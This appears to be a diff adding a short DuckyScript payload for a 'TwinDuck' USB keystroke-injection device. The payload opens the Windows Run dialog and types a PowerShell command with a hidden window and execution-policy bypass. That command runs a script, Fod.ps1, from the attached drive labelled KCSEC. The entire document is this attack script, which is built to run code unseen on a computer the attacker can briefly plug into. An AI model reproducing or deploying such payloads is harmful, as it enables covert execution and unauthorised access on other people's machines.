@@ -1,0 +1,5 @@
+REM KCSEC - Powershell FOD Script for TwinDuck (Special 2)
+GUI r
+DELAY 1000
+STRING powershell -WindowStyle Hidden -ep bypass ".(((Get-Volume -FileSystemLabel KCSEC).DriveLetter)+':\Fod.ps1')"  
+ENTER
